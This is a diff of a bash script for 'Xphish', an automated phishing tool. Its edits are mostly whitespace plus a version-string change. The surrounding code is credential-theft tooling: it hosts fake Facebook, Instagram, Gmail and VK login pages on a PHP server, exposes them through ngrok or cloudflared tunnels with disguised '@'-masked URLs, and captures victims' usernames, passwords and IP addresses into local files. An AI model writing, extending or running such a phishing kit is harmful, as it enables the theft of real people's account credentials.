@@ -1,18 +1,11 @@
 #!/bin/bash
-
 ##   Xphish 	: 	Automated Phishing Tool
 ##   Author 	: 	Rahul Bhatt
 ##   Version 	: 	2.2
 ##   Github 	: 	https://github.com/rahul-bhatt43/
-
-
 ## If you Copy Then Give the credits :)
 ## Thanks to
 ## htr-tech aka Tahmid rayat 
-
-
-
-
 ##                   GNU GENERAL PUBLIC LICENSE
 ##                    Version 3, 29 June 2007
 ##
@@ -85,15 +78,12 @@
 ##
 ##      Copyright (C) 2022  RAHUL-BHATT43 (https://github.com/rahul-bhatt43)
 ##
-
-
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
 REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
 MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
-
 ## Directories
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
@@ -107,28 +97,23 @@ fi
 if [[ -e ".cld.log" ]]; then
 	rm -rf ".cld.log"
 fi
-
 ## Script termination
 exit_on_signal_SIGINT() {
     { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
     exit 0
 }
-
 exit_on_signal_SIGTERM() {
     { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
     exit 0
 }
-
 trap exit_on_signal_SIGINT SIGINT
 trap exit_on_signal_SIGTERM SIGTERM
-
 ## Reset terminal colors
 reset_color() {
 	tput sgr0   # reset attributes
 	tput op     # reset color
     return
 }
-
 ## Kill already running process
 kill_pid() {
 	if [[ `pidof php` ]]; then
@@ -141,7 +126,6 @@ kill_pid() {
 		killall cloudflared > /dev/null 2>&1
 	fi
 }
-
 ## Banner
 banner() {
 	cat <<- EOF
@@ -157,7 +141,6 @@ banner() {
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by rahul-bhatt43 (Rahul.Bhatt)${WHITE}
 	EOF
 }
-
 ## Small Banner
 banner_small() {
 	cat <<- EOF
@@ -167,7 +150,6 @@ banner_small() {
 		${BLUE}  ░▀░▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀${WHITE} 2.2
 	EOF
 }
-
 ## Dependencies
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
@@ -215,7 +197,6 @@ dependencies() {
 	fi
 
 }
-
 ## Download Ngrok
 download_ngrok() {
 	url="$1"
@@ -234,7 +215,6 @@ download_ngrok() {
 		{ reset_color; exit 1; }
 	fi
 }
-
 ## Download Cloudflared
 download_cloudflared() {
 	url="$1"
@@ -251,7 +231,6 @@ download_cloudflared() {
 		{ reset_color; exit 1; }
 	fi
 }
-
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
@@ -271,7 +250,6 @@ install_ngrok() {
 	fi
 
 }
-
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
@@ -291,21 +269,19 @@ install_cloudflared() {
 	fi
 
 }
-
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
 	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
-
 ## About
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${GREEN}Author   ${RED}:  ${ORANGE}RAHUL BHATT ${RED}[ ${ORANGE}RAHUL-BHATT43 ${RED}]
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/rahul-bhatt43/
-		${GREEN}Version  ${RED}:  ${ORANGE}2.2
+		${GREEN}Version  ${RED}:  ${ORANGE}1
 
 		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
 								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1,AliMilani ${RESETBG}
@@ -331,7 +307,6 @@ about() {
 			{ sleep 1; about; };;
 	esac
 }
-
 ## Setup website and start php server
 HOST='127.0.0.1'
 PORT='8080'
@@ -343,7 +318,6 @@ setup_site() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
-
 ## Get IP address
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
@@ -352,7 +326,6 @@ capture_ip() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
 	cat .server/www/ip.txt >> ip.txt
 }
-
 ## Get credentials
 capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
@@ -364,7 +337,6 @@ capture_creds() {
 	cat .server/www/usernames.txt >> usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
-
 ## Print data
 capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
@@ -383,7 +355,6 @@ capture_data() {
 		sleep 0.75
 	done
 }
-
 ## Start ngrok
 start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
@@ -403,10 +374,7 @@ start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
 	capture_data
 }
-
-
 ## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
-
 ## Start Cloudflared
 start_cloudflared() { 
         rm .cld.log > /dev/null 2>&1 &
@@ -428,7 +396,6 @@ start_cloudflared() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
 	capture_data
 }
-
 ## Start localhost
 start_localhost() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
@@ -437,7 +404,6 @@ start_localhost() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
-
 ## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
@@ -463,7 +429,6 @@ tunnel_menu() {
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
-
 ## Facebook
 site_facebook() {
 	cat <<- EOF
@@ -499,7 +464,6 @@ site_facebook() {
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
-
 ## Instagram
 site_instagram() {
 	cat <<- EOF
@@ -535,7 +499,6 @@ site_instagram() {
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
-
 ## Gmail/Google
 site_gmail() {
 	cat <<- EOF
@@ -566,7 +529,6 @@ site_gmail() {
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
-
 ## Vk
 site_vk() {
 	cat <<- EOF
@@ -592,7 +554,6 @@ site_vk() {
 			{ sleep 1; clear; banner_small; site_vk; };;
 	esac
 }
-
 ## Menu
 main_menu() {
 	{ clear; banner; echo; }
@@ -757,7 +718,6 @@ main_menu() {
 	
 	esac
 }
-
 ## Main
 kill_pid
 dependencies
